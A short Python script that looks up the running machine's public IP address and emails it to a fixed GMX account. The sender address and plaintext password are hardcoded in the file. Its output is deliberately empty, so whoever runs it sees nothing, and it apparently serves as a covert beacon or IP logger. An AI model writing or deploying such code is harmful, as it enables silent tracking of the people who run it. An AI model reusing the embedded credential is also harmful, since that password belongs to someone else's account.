import requests
import smtplib
from email.message import EmailMessage

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "Could not retrieve IP"

def send_email(ip_address):
    email_sender = "sdwsa.aaa@gmx.co.uk"
    email_password = '?KcD4cABS"ywwD;'
    email_receiver = "asdasd.dsfdsf@gmx.com"

    msg = EmailMessage()
    msg.set_content(f"Ip: {ip_address}")
    msg['Subject'] = 'New IP Connection Notice'
    msg['From'] = email_sender
    msg['To'] = email_receiver

    try:
        with smtplib.SMTP_SSL('smtp.gmx.com', 465) as smtp:
            smtp.login(email_sender, email_password)
            smtp.send_message(msg)
        print("")
    except Exception as e:
        print("")

if __name__ == "__main__":
    ip = get_public_ip()
    send_email(ip)
